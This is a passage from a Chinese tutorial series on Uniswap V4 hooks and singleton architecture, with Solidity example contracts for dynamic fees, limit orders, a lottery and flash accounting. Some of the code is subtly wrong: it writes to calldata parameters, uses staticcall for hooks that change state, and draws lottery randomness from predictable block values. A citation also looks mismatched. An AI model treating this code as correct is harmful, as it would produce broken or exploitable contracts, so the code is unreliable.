(params.amountSpecified &gt; 0) {\n        _distributeTradingFees(key, callerDelta);\n    }\n \n    // 应用场景4: 彩票/空投\n    // 随机选择交易者进行奖励\n    _maybeRunLottery(sender, key);\n \n    return (IHooks.afterSwap.selector);\n}\n2.5 捐赠Hooks\nbeforeDonate / afterDonate\nfunction beforeDonate(\n    address sender,\n    PoolKey calldata key,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata hookData\n) external returns (bytes4) {\n    // 应用场景1: 捐赠限制\n    // 限制只能捐赠一定比例\n    uint256 totalLiquidity = poolManager.pools(key.poolId).liquidity;\n    require(amount0 &lt; totalLiquidity / 10, &quot;Donate too much&quot;);\n \n    // 应用场景2: 捐赠匹配\n    // 按比例匹配捐赠给流动性提供者\n    if (amount0 &gt; 0) {\n        _matchDonation(sender, key, amount0);\n    }\n \n    return (IHooks.beforeDonate.selector);\n}\n\n3. Hook执行时序\n3.1 完整的Hook调用链\nsequenceDiagram\n    participant U as User\n    participant R as Router\n    participant PM as PoolManager\n    participant H as Hook\n\n    Note over U,H: 池子初始化\n    U-&gt;&gt;R: initialize(poolKey, sqrtPriceX96)\n    R-&gt;&gt;PM: initialize(key, sqrtPriceX96)\n    PM-&gt;&gt;H: beforeInitialize()\n    H--&gt;&gt;PM: selector\n    PM-&gt;&gt;PM: 创建池子状态\n    PM-&gt;&gt;H: afterInitialize()\n    H--&gt;&gt;PM: selector\n\n    Note over U,H: 添加流动性\n    U-&gt;&gt;R: mint(position, liquidity)\n    R-&gt;&gt;PM: modifyPosition(key, params)\n    PM-&gt;&gt;H: beforeModifyPosition()\n    H--&gt;&gt;PM: (selector, delta0, delta1)\n    PM-&gt;&gt;PM: 更新流动性\n    PM-&gt;&gt;H: afterModifyPosition()\n    H--&gt;&gt;PM: selector\n\n    Note over U,H: 执行交换\n    U-&gt;&gt;R: swap(key, params)\n    R-&gt;&gt;PM: swap(key, params)\n    PM-&gt;&gt;H: beforeSwap()\n    H--&gt;&gt;PM: (selector, delta0, delta1)\n    PM-&gt;&gt;PM: 执行交换逻辑\n    PM-&gt;&gt;H: afterSwap()\n    H--&gt;&gt;PM: selector\n\n3.2 Hook返回值处理\n// PoolManager中的Hook调用模式\nfunction _callHookAndReturnValue(\n    IHooks hooks,\n    bytes4 selector,\n    bytes memory data\n) internal returns (bytes4 returnedSelector, int256 delta0, int256 delta1) {\n    (bool success, bytes memory result) = address(hooks).staticcall(data);\n \n    if (!success) {\n        // Hook未实现或调用失败\n        if (result.length == 0) {\n            // 未实现，返回默认值\n            return (bytes4(0), 0, 0);\n        }\n        // 调用失败，revert\n        revert(&quot;Hook call failed&quot;);\n    }\n \n    // 解析返回值\n    returnedSelector = bytes4(result[:4]);\n    delta0 = int256(bytes32(result[4:36]));\n    delta1 = int256(bytes32(result[36:68]));\n \n    // 验证selector\n    require(returnedSelector == selector, &quot;Invalid hook return&quot;);\n}\n3.3 Hook调用Gas成本\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作基础GasHook调用总计initialize~50,000~5,000~55,000modifyPosition~80,000~10,000~90,000swap~60,000~15,000~75,000\n优化技巧：\n\n使用view函数检查Hook是否实现\n避免在Hook中进行存储操作\n批量处理逻辑\n\n\n4. Hook实现模式\n4.1 NoOpHook（空Hook）\n最简单的Hook，什么都不做：\ncontract NoOpHook is IHooks {\n    function beforeInitialize(\n        address sender,\n        PoolKey calldata key,\n        uint160 sqrtPriceX96,\n        bytes calldata hookData\n    ) external returns (bytes4) {\n        return (IHooks.beforeInitialize.selector);\n    }\n \n    // 其他Hook函数都返回selector但不做任何事\n    // 或者直接不实现，让PoolManager检查到未实现\n}\n4.2 DynamicFeeHook（动态费率）\n根据市场条件动态调整费率：\ncontract DynamicFeeHook is IHooks {\n    IPoolManager public immutable poolManager;\n    uint256 public baseFee = 3000; // 0.3%\n \n    // 费率范围\n    uint256 public constant MIN_FEE = 100;   // 0.01%\n    uint256 public constant MAX_FEE = 10000; // 1%\n \n    // 波动率窗口\n    uint256 public constant VOLATILITY_WINDOW = 1 hours;\n \n    struct PoolState {\n        uint256 lastTimestamp;\n        uint256 lastPrice;\n        uint256 cumulativeVolatility;\n    }\n \n    mapping(bytes32 =&gt; PoolState) public poolStates;\n \n    constructor(IPoolManager _poolManager) {\n        poolManager = _poolManager;\n    }\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        // 获取当前价格\n        (uint160 currentPriceX96, , ,) = poolManager.slot0s(key.poolId);\n        uint256 currentPrice = currentPriceX96;\n \n        // 更新波动率\n        PoolState storage state = poolStates[key.poolId];\n        uint256 volatility = _updateVolatility(\n            key.poolId,\n            currentPrice,\n            state.lastTimestamp,\n            block.timestamp\n        );\n \n        state.lastPrice = currentPrice;\n        state.lastTimestamp = block.timestamp;\n \n        // 计算动态费率\n        uint256 dynamicFee = _calculateDynamicFee(volatility);\n \n        // 更新Hook费率\n        poolManager.setHookFee(key.poolId, uint16(dynamicFee - baseFee));\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function _updateVolatility(\n        bytes32 poolId,\n        uint256 currentPrice,\n        uint256 lastTimestamp,\n        uint256 currentTimestamp\n    ) private returns (uint256) {\n        if (lastTimestamp == 0) return 0;\n \n        uint256 priceChange = currentPrice &gt; poolStates[poolId].lastPrice\n            ? currentPrice - poolStates[poolId].lastPrice\n            : poolStates[poolId].lastPrice - currentPrice;\n \n        uint256 timeDelta = currentTimestamp - lastTimestamp;\n        uint256 volatility = (priceChange * 1e18) / poolStates[poolId].lastPrice;\n \n        // 指数移动平均\n        uint256 alpha = timeDelta * 1e18 / VOLATILITY_WINDOW;\n        poolStates[poolId].cumulativeVolatility =\n            (volatility * alpha + poolStates[poolId].cumulativeVolatility * (1e18 - alpha)) / 1e18;\n \n        return poolStates[poolId].cumulativeVolatility;\n    }\n \n    function _calculateDynamicFee(uint256 volatility) private view returns (uint256) {\n        // 波动率越高，费率越高\n        uint256 feeAdjustment = (volatility * 7000) / 1e18; // 最高增加0.7%\n        uint256 dynamicFee = baseFee + feeAdjustment;\n \n        // 限制在范围内\n        return _min(MAX_FEE, _max(MIN_FEE, dynamicFee));\n    }\n \n    function _min(uint256 a, uint256 b) private pure returns (uint256) {\n        return a &lt; b ? a : b;\n    }\n \n    function _max(uint256 a, uint256 b) private pure returns (uint256) {\n        return a &gt; b ? a : b;\n    }\n}\n4.3 LimitOrderHook（限价订单）\n实现类似订单簿的限价单功能：\ncontract LimitOrderHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    struct LimitOrder {\n        address owner;\n        int24 tick;\n        uint128 amount;\n        bool zeroForOne;\n        bool filled;\n    }\n \n    mapping(uint256 =&gt; LimitOrder) public orders;\n    uint256 public nextOrderId = 1;\n \n    // 创建限价单\n    function createLimitOrder(\n        PoolKey calldata key,\n        int24 tick,\n        uint128 amount,\n        bool zeroForOne\n    ) external returns (uint256) {\n        uint256 orderId = nextOrderId++;\n \n        orders[orderId] = LimitOrder({\n            owner: msg.sender,\n            tick: tick,\n            amount: amount,\n            zeroForOne: zeroForOne,\n            filled: false\n        });\n \n        emit LimitOrderCreated(orderId, msg.sender, key.poolId, tick, amount);\n \n        return orderId;\n    }\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        (uint160 currentPriceX96, int24 currentTick, , ) = poolManager.slot0s(key.poolId);\n \n        // 检查是否有匹配的限价单\n        for (uint256 i = 1; i &lt; nextOrderId; i++) {\n            LimitOrder storage order = orders[i];\n \n            if (order.filled) continue;\n            if (order.zeroForOne == params.zeroForOne) continue;\n \n            // 检查是否到达目标价格\n            bool orderReached = order.zeroForOne\n                ? currentTick &lt;= order.tick\n                : currentTick &gt;= order.tick;\n \n            if (orderReached) {\n                // 执行限价单\n                _fillOrder(order, key, params);\n \n                // 更新swap参数\n                params.amountSpecified += int256(order.amount);\n            }\n        }\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function _fillOrder(\n        LimitOrder storage order,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params\n    ) private {\n        order.filled = true;\n \n        // 执行交换给订单创建者\n        // ... 实际的交换逻辑\n \n        emit LimitOrderFilled(\n            nextOrderId - 1,\n            order.owner,\n            key.poolId,\n            order.amount\n        );\n    }\n \n    // 取消限价单\n    function cancelLimitOrder(uint256 orderId) external {\n        require(orders[orderId].owner == msg.sender, &quot;Not owner&quot;);\n        orders[orderId].filled = true;\n        emit LimitOrderCancelled(orderId);\n    }\n \n    event LimitOrderCreated(uint256 indexed orderId, address indexed owner, bytes32 poolId, int24 tick, uint128 amount);\n    event LimitOrderFilled(uint256 indexed orderId, address indexed owner, bytes32 poolId, uint128 amount);\n    event LimitOrderCancelled(uint256 indexed orderId);\n}\n4.4 LotteryHook（彩票机制）\n随机奖励交易者：\ncontract LotteryHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    uint256 public prizePool;\n    uint256 public lastLotteryTime;\n    uint256 public lotteryInterval = 1 days;\n \n    struct Ticket {\n        address participant;\n        uint256 weight;\n    }\n \n    Ticket[] public tickets;\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        // 每笔交易收取小额费用进入奖池\n        uint256 lotteryFee = abs(params.amountSpecified) / 1000; // 0.1%\n        prizePool += lotteryFee;\n \n        // 记录彩票\n        tickets.push(Ticket({\n            participant: sender,\n            weight: abs(params.amountSpecified)\n        }));\n \n        // 检查是否应该开奖\n        if (block.timestamp &gt;= lastLotteryTime + lotteryInterval) {\n            _runLottery(key);\n        }\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function _runLottery(PoolKey calldata key) private {\n        // 计算总权重\n        uint256 totalWeight = 0;\n        for (uint256 i = 0; i &lt; tickets.length; i++) {\n            totalWeight += tickets[i].weight;\n        }\n \n        // 随机选择获胜者\n        uint256 random = uint256(keccak256(abi.encodePacked(\n            block.timestamp,\n            block.prevrandao,\n            tickets.length\n        )));\n \n        uint256 winningWeight = random % totalWeight;\n        uint256 cumulativeWeight = 0;\n        address winner;\n \n        for (uint256 i = 0; i &lt; tickets.length; i++) {\n            cumulativeWeight += tickets[i].weight;\n            if (winningWeight &lt; cumulativeWeight) {\n                winner = tickets[i].participant;\n                break;\n            }\n        }\n \n        // 发放奖励\n        if (winner != address(0)) {\n            // 将奖池中的代币转给获胜者\n            _transferPrize(winner, key, prizePool);\n            emit LotteryWon(winner, prizePool);\n        }\n \n        // 重置\n        prizePool = 0;\n        delete tickets;\n        lastLotteryTime = block.timestamp;\n    }\n \n    function _transferPrize(\n        address winner,\n        PoolKey calldata key,\n        uint256 amount\n    ) private {\n        // 实际的奖励转账逻辑\n        // ...\n    }\n \n    function abs(int256 x) private pure returns (uint256) {\n        return x &gt;= 0 ? uint256(x) : uint256(-x);\n    }\n \n    event LotteryWon(address indexed winner, uint256 amount);\n}\n4.5 VolatilityHook（波动率调整）\n根据波动率调整流动性分布：\ncontract VolatilityHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    mapping(bytes32 =&gt; uint256) public volatilityScores;\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        // 计算瞬时波动率\n        uint256 volatility = _calculateInstantVolatility(key, params);\n        volatilityScores[key.poolId] = volatility;\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function afterModifyPosition(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.ModifyPositionParams calldata params,\n        BalanceDelta callerDelta,\n        bytes calldata hookData\n    ) external returns (bytes4) {\n        // 根据当前波动率建议流动性分布\n        uint256 volatility = volatilityScores[key.poolId];\n \n        if (volatility &gt; 1e17) { // 高波动\n            // 建议更宽的价格区间\n            emit SuggestedRange(key.poolId, params.tickLower - 1000, params.tickUpper + 1000);\n        } else if (volatility &lt; 1e15) { // 低波动\n            // 建议更窄的价格区间\n            emit SuggestedRange(key.poolId, params.tickLower + 100, params.tickUpper - 100);\n        }\n \n        return (IHooks.afterModifyPosition.selector);\n    }\n \n    function _calculateInstantVolatility(\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params\n    ) private view returns (uint256) {\n        (uint160 priceX96, , ,) = poolManager.slot0s(key.poolId);\n        uint256 priceImpact = abs(params.amountSpecified) * 1e18 / uint256(priceX96);\n        return priceImpact;\n    }\n \n    function abs(int256 x) private pure returns (uint256) {\n        return x &gt;= 0 ? uint256(x) : uint256(-x);\n    }\n \n    event SuggestedRange(bytes32 indexed poolId, int24 suggestedLower, int24 suggestedUpper);\n}\n\n5. Hook开发最佳实践\n5.1 安全考虑\ncontract SecureHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    // 1. 验证调用者\n    modifier onlyPoolManager() {\n        require(msg.sender == address(poolManager), &quot;Not PoolManager&quot;);\n        _;\n    }\n \n    // 2. 检查重入\n    modifier nonReentrant() {\n        require(locked == 0, &quot;Reentrant&quot;);\n        locked = 1;\n        _;\n        locked = 0;\n    }\n    uint256 private locked;\n \n    // 3. 防止整数溢出\n    using SafeMath for uint256;\n \n    // 4. 事件记录\n    event HookCalled(bytes4 indexed selector, address indexed caller);\n \n    // 5. 实现所有Hook函数\n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external onlyPoolManager nonReentrant returns (bytes4, int256, int256) {\n        emit HookCalled(IHooks.beforeSwap.selector, sender);\n \n        // Hook逻辑\n        // ...\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    // ... 其他Hook函数\n}\n5.2 Gas优化技巧\ncontract GasOptimizedHook is IHooks {\n    // 1. 使用immutable\n    IPoolManager public immutable poolManager;\n \n    // 2. 打包存储变量\n    struct PackedData {\n        uint128 value1;  // 128位\n        uint64 value2;   // 64位\n        bool flag1;      // 1位\n        bool flag2;      // 1位\n        // 总计: 194位，可以放在一个slot中\n    }\n    mapping(bytes32 =&gt; PackedData) public packedData;\n \n    // 3. 使用calldata而不是memory\n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        // 4. 短路求值\n        if (params.amountSpecified == 0) {\n            return (IHooks.beforeSwap.selector, 0, 0);\n        }\n \n        // 5. 避免循环中的存储操作\n        PackedData memory data = packedData[key.poolId];\n        // 批量处理\n        data.value1 += 1;\n        data.value2 += 2;\n        packedData[key.poolId] = data;\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    // 6. 缓存存储变量\n    function expensiveOperation() external {\n        uint256 cachedValue = someStorageVariable;\n        for (uint256 i = 0; i &lt; 100; i++) {\n            // 使用cachedValue\n        }\n        someStorageVariable = cachedValue;\n    }\n}\n5.3 常见陷阱\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n陷阱说明解决方案Hook失败导致核心失败Hook revert会阻止整个交易使用try-catch或严格测试状态不一致Hook修改状态但核心操作失败在after* Hook中验证重入攻击Hook调用外部合约使用nonReentrant修饰符Gas griefingHook消耗过多gas设置gas限制权限绕过未验证msg.sender添加onlyPoolManager修饰符\n5.4 测试策略\n// Hook测试模板\ncontract HookTest is Test {\n    Hook target;\n    PoolManager poolManager;\n    PoolKey poolKey;\n \n    function setUp() public {\n        // 部署依赖合约\n        poolManager = new PoolManager();\n        target = new Hook(poolManager);\n \n        // 设置测试池子\n        poolKey = PoolKey({\n            currency0: CurrencyLibrary.NATIVE,\n            currency1: Currency.wrap(address(usdc)),\n            fee: 3000,\n            tickSpacing: 60,\n            hooks: target\n        });\n    }\n \n    function testBeforeSwap_ReturnsCorrectSelector() public {\n        (bytes4 selector,,) = target.beforeSwap(\n            address(this),\n            poolKey,\n            SwapParams({\n                zeroForOne: true,\n                amountSpecified: 1e18,\n                sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1,\n                hookData: &quot;&quot;\n            }),\n            &quot;&quot;\n        );\n \n        assertEq(selector, IHooks.beforeSwap.selector);\n    }\n \n    function testBeforeSwap_RevertsWithInvalidParams() public {\n        vm.expectRevert();\n        target.beforeSwap(\n            address(0), // 无效地址\n            poolKey,\n            SwapParams({\n                zeroForOne: true,\n                amountSpecified: -1, // 无效数量\n                sqrtPriceLimitX96: 0,\n                hookData: &quot;&quot;\n            }),\n            &quot;&quot;\n        );\n    }\n \n    function testFuzz_BeforeSwap(int256 amount) public {\n        vm.assume(amount &gt; 0);\n        vm.assume(amount &lt; 1e30);\n \n        (bytes4 selector,,) = target.beforeSwap(\n            address(this),\n            poolKey,\n            SwapParams({\n                zeroForOne: true,\n                amountSpecified: amount,\n                sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1,\n                hookData: &quot;&quot;\n            }),\n            &quot;&quot;\n        );\n \n        assertEq(selector, IHooks.beforeSwap.selector);\n    }\n}\n\n6. 本章小结\n6.1 Hooks能力总结\nmindmap\n  root((Hooks能力))\n    生命周期管理\n      beforeInitialize\n      afterInitialize\n      初始化验证\n      自定义参数\n    头寸管理\n      beforeModifyPosition\n      afterModifyPosition\n      动态费用\n      条件限制\n      收益复投\n    交换控制\n      beforeSwap\n      afterSwap\n      动态费率\n      MEV保护\n      限价订单\n    捐赠处理\n      beforeDonate\n      afterDonate\n      捐赠限制\n      匹配奖励\n\n6.2 Hook函数快速参考\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHook函数触发时机返回值主要用途beforeInitialize创建池子前selector参数验证、初始价格设置afterInitialize创建池子后selector事件记录、后续操作触发beforeModifyPosition修改头寸前selector, delta0, delta1动态费用、条件限制afterModifyPosition修改头寸后selector费用分配、奖励计算beforeSwap执行交换前selector, delta0, delta1动态费率、自定义定价afterSwap执行交换后selector费用分配、交易追踪beforeDonate捐赠前selector捐赠限制、匹配afterDonate捐赠后selector奖励分配\n6.3 关键要点\n\nHooks是可选的 - 未实现的Hook不会影响核心功能\n返回值重要 - selector用于验证实现，delta用于自定义计算\nGas敏感 - Hook代码需要优化以避免过高的gas成本\n安全第一 - Hook有权限访问核心状态，需要严格审计\n可组合性强 - Hook可以调用其他合约，实现复杂逻辑\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨单例架构与瞬时会计，包括：\n\nPoolManager合约结构详解\nPoolKey和PoolId设计\n瞬时会计系统的实现\nsettle()和take()函数原理\nCurrency类型与原生ETH支持\n\n\n参考资料\n\nUniswap V4 Core - IHooks.sol\nUniswap V4 Periphery - Hook Examples\nEIP-3372: Precompile for Ed25519\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/03-单例架构与瞬时会计":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/03-单例架构与瞬时会计","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/03-单例架构与瞬时会计.md","title":"03-单例架构与瞬时会计","links":[],"tags":[],"content":"死磕Uniswap V4（三）：单例架构与瞬时会计\n\n本文是「死磕Uniswap V4」系列的第三篇，深入剖析V4的单例架构设计和瞬时会计系统。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4概述与架构革命Singleton、Hooks、Flash Accounting02Hooks机制深度解析Hook接口、生命周期、实现模式03单例架构与瞬时会计PoolManager、Currency、Accounting04交换流程与Hook执行时序swap函数、Hook调用链、Gas分析05费用系统与动态费率自定义费率、动态调整、费用分配06账户抽象与原生ETHCurrency类型、settle/take、批量操作07安全分析与最佳实践Hook安全、MEV防护、审计要点\n\n1. Singleton架构深度解析\n1.1 从多合约到单例\nUniswap V3采用”每池一合约”的架构，而V4通过Singleton模式将所有池子集中在一个合约中。\ngraph TB\n    subgraph V3Model[&quot;V3多合约模式&quot;]\n        direction LR\n        V3F[Factory] --&gt; V3P1[Pool ETH/USDC]\n        V3F --&gt; V3P2[Pool ETH/USDT]\n        V3F --&gt; V3P3[Pool WBTC/ETH]\n        V3F --&gt; V3PN[Pool ...]\n\n        style V3P1 fill:#ffcdd2\n        style V3P2 fill:#ffcdd2\n        style V3P3 fill:#ffcdd2\n    end\n\n    subgraph V4Model[&quot;V4单例模式&quot;]\n        direction TB\n        V4M[PoolManager Singleton]\n        V4M --&gt; V4S1[State ETH/USDC]\n        V4M --&gt; V4S2[State ETH/USDT]\n        V4M --&gt; V4S3[State WBTC/ETH]\n        V4M --&gt; V4SN[State ...]\n\n        style V4M fill:#c8e6c9\n    end\n\n1.2 为什么选择Singleton？\nV3多合约的问题：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n问题影响Gas成本CREATE2部署每池独立部署~100,000 gas跨池调用需要多次外部调用+2,600 gas/次状态同步难以批量操作无法优化资源共享无法共享数据冗余存储\nV4单例的优势：\nflowchart LR\n    subgraph Benefits[&quot;Singleton优势&quot;]\n        B1[部署成本降低95%]\n        B2[跨池操作优化]\n        B3[统一状态管理]\n        B4[原子性操作]\n    end\n\n    subgraph Examples[&quot;实际应用&quot;]\n        E1[多跳交易单次调用]\n        E2[批量流动性管理]\n        E3[统一费用结算]\n        E4[原子性跨池套利]\n    end\n\n    B1 --&gt; E1\n    B2 --&gt; E2\n    B3 --&gt; E3\n    B4 --&gt; E4\n\n\n2. PoolManager合约详解\n2.1 核心数据结构\ncontract PoolManager is IPoolManager, IHooks, ERC1155Holder {\n    // ============================================================\n    // 核心存储结构\n    // ============================================================\n \n    /// @notice 池子状态（使用poolId索引）\n    mapping(bytes32 poolId =&gt; Pool.State) public pools;\n \n    /// @notice 池子的Slot0数据\n    mapping(bytes32 poolId =&gt; Pool.Slot0) public slot0s;\n \n    /// @notice Tick间距配置\n    mapping(bytes32 poolId =&gt; int24) public tickSpacings;\n \n    /// @notice 费用配置\n    mapping(bytes32 poolId =&gt; Pool.Fees) public fees;\n \n    /// @notice 协议费用配置\n    mapping(bytes32 poolId =&gt; ProtocolFees) public protocolFees;\n \n    /// @notice Hook合约地址\n    mapping(bytes32 poolId =&gt; IHooks) public hooks;\n \n    /// @notice Tick位图（用于高效查找）\n    mapping(bytes32 poolId =&gt; mapping(int16 =&gt; uint256)) public tickBitmaps;\n \n    /// @notice Tick数据\n    mapping(bytes32 poolId =&gt; mapping(int24 =&gt; Tick.Info)) public ticks;\n \n    // ============================================================\n    // 瞬时会计系统\n    // ============================================================\n \n    /// @notice 账户差额记录\n    /// @dev 正数 = 应收款，负数 = 应付款\n    mapping(address account =&gt; mapping(Currency currency =&gt; int256)) public deltas;\n \n    /// @notice 锁定状态（防止重入）\n    uint256 private locked = 1;\n \n    // ============================================================\n    // Currency系统\n    // ============================================================\n \n    /// @notice Currency地址映射\n    mapping(Currency =&gt; address) public currencyAddresses;\n \n    // ============================================================\n    // 协议配置\n    // ============================================================\n \n    /// @notice 全局协议费用\n    uint256 public protocolFees0;\n    uint256 public protocolFees1;\n \n    /// @notice PoolManager部署者（具有特殊权限）\n    address public immutable deployer;\n}\n2.2 Pool.State结构详解\nlibrary Pool {\n    /// @notice 池子完整状态\n    struct State {\n        // 流动性相关\n        uint128 liquidity;          // 当前活跃流动性\n        uint128 liquidityNext;      // 下一个tick的流动性净值\n \n        // Slot0数据（单独存储以优化gas）\n        Slot0 slot0;\n \n        // 费用数据\n        Fees fees;\n \n        // 预言机数据\n        uint16 observationIndex;    // 当前观察索引\n        uint16 observationCardinality; // 观察基数\n    }\n \n    /// @notice Slot0数据（最常访问）\n    struct Slot0 {\n        // 价格和tick\n        uint160 sqrtPriceX96;       // 当前价格的平方根\n        int24 tick;                 // 当前tick索引\n \n        // 预言机相关\n        uint16 observationIndex;    // 当前观察索引\n \n        // 协议费用\n        uint24 protocolFee;         // 协议费率（左8位: token0, 右8位: token1）\n \n        // 锁定状态\n        bool unlocked;              // 重入锁（true = 未锁定）\n    }\n \n    /// @notice 费用结构\n    struct Fees {\n        uint16 fee;                 // 基础费率（1e-6单位）\n        uint16 hookFee;             // Hook控制的动态费率部分\n    }\n \n    /// @notice Tick信息\n    struct TickInfo {\n        uint128 liquidityGross;     // 该tick的总流动性\n        int128 liquidityNet;        // 跨越该tick时的流动性变化\n        uint256 feeGrowthOutside0X128;  // token0费用增长（外部）\n        uint256 feeGrowthOutside1X128;  // token1费用增长（外部）\n        int56 tickCumulativeOutside;    // tick累积（外部）\n        uint160 secondsPerLiquidityOutsideX128; // 每流动性秒数（外部）\n        uint32 secondsOutside;      // 该tick外部经过的秒数\n        bool initialized;           // 是否已初始化\n    }\n}\n2.3 PoolKey和PoolId\n/// @notice 池子标识符\nstruct PoolKey {\n    Currency currency0;         // Token0（或原生ETH）\n    Currency currency1;         // Token1（或原生ETH）\n    uint24 fee;                 // 基础费率（1e-6单位）\n    int24 tickSpacing;          // Tick间距\n    IHooks hooks;               // Hook合约地址\n}\n \n/// @notice 计算PoolId\n/// @dev poolId是池子的唯一标识符\nfunction getPoolId(PoolKey calldata key) pure returns (bytes32) {\n    return keccak256(abi.encode(key));\n}\nPoolId设计原理：\nflowchart LR\n    Input[PoolKey] --&gt; Encode[abi.encode]\n    Encode --&gt; Hash[keccak256]\n    Hash --&gt; Output[poolId&lt;br/&gt;bytes32]\n\n    Input2[&quot;currency0&lt;br/&gt;currency1&lt;br/&gt;fee&lt;br/&gt;tickSpacing&lt;br/&gt;hooks&quot;] --&gt; Input\n\n    style Output fill:#c8e6c9\n\n为什么使用PoolId而不是合约地址？\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n对比项V3（合约地址）V4（PoolId）存储位置独立合约mapping索引部署成本CREATE2 (~100k gas)纯计算 (0 gas)查询成本EXTERNALCALL (2,600 gas)SLOAD (2,100 gas)批量操作需要多笔交易单笔交易完成状态同步需要跨合约调用直接访问mapping\n2.4 初始化流程\nfunction initialize(PoolKey calldata key, uint160 sqrtPriceX96) external {\n    bytes32 poolId = key.poolId;\n \n    // 1. 验证池子不存在\n    require(slot0s[poolId].sqrtPriceX96 == 0, &quot;Already initialized&quot;);\n \n    // 2. 验证参数\n    require(sqrtPriceX96 &gt;= TickMath.MIN_SQRT_RATIO, &quot;Price too low&quot;);\n    require(sqrtPriceX96 &lt;= TickMath.MAX_SQRT_RATIO, &quot;Price too high&quot;);\n \n    // 3. 调用beforeSwap Hook\n    if (address(key.hooks) != address(0)) {\n        (bool success, bytes memory data) = address(key.hooks).staticcall(\n            abi.encodeCall(\n                IHooks.beforeInitialize,\n                (msg.sender, key, sqrtPriceX96, &quot;&quot;)\n            )\n        );\n        if (success) {\n            // Hook可能返回自定义价格\n            (bytes4 selector, uint160 customPrice) = abi.decode(data, (bytes4, uint160));\n            if (selector == IHooks.beforeInitialize.selector &amp;&amp; customPrice != 0) {\n                sqrtPriceX96 = customPrice;\n            }\n        }\n    }\n \n    // 4. 设置初始状态\n    slot0s[poolId] = Pool.Slot0({\n        sqrtPriceX96: sqrtPriceX96,\n        tick: TickMath.getTickAtSqrtRatio(sqrtPriceX96),\n        observationIndex: 0,\n        protocolFee: 0,\n        unlocked: true\n    });\n \n    // 5. 初始化Tick间距\n    tickSpacings[poolId] = key.tickSpacing;\n \n    // 6. 初始化费用\n    fees[poolId] = Pool.Fees({\n        fee: key.fee,\n        hookFee: 0\n    });\n \n    // 7. 保存Hook地址\n    hooks[poolId] = key.hooks;\n \n    // 8. 调用afterInitialize Hook\n    if (address(key.hooks) != address(0)) {\n        address(key.hooks).staticcall(\n            abi.encodeCall(\n                IHooks.afterInitialize,\n                (msg.sender, key, sqrtPriceX96, &quot;&quot;)\n            )\n        );\n    }\n \n    emit Initialize(poolId, key.currency0, key.currency1, sqrtPriceX96, key.tickSpacing);\n}\n\n3. 瞬时会计系统\n3.1 设计理念\n传统模式（V3）的问题：\nsequenceDiagram\n    participant U as User\n    participant P as V3 Pool\n    participant T as Token\n\n    U-&gt;&gt;P: swap(amountIn)\n    Note over P,T: 每个操作都需要&lt;br/&gt;实际的代币转账\n    P-&gt;&gt;T: transfer(user, amountOut)\n    P-&gt;&gt;U: callback()\n    U-&gt;&gt;T: transfer(pool, amountIn)\n    P-&gt;&gt;P: 验证余额\n\n    Note over U,T: 多次外部调用&lt;br/&gt;高gas成本&lt;br/&gt;无法批量操作\n\n瞬时会计模式（V4）的优势：\nsequenceDiagram\n    participant U as User\n    participant P as V4 PoolManager\n    participant T as Token\n\n    U-&gt;&gt;P: swap(amountIn)\n    Note over P: 仅记录账面变化&lt;br/&gt;无实际转账\n    P-&gt;&gt;P: deltas[user][token] += amountOut\n    P-&gt;&gt;P: deltas[user][token] -= amountIn\n    P--&gt;&gt;U: 返回结果\n\n    Note over U,T: 结算阶段&lt;br/&gt;（unlock时）\n    P-&gt;&gt;T: transferFrom(user, pool, amountIn)\n    P-&gt;&gt;T: transfer(user, amountOut)\n\n    Note over U,T: 单次结算&lt;br/&gt;可批量操作&lt;br/&gt;Gas优化\n\n3.2 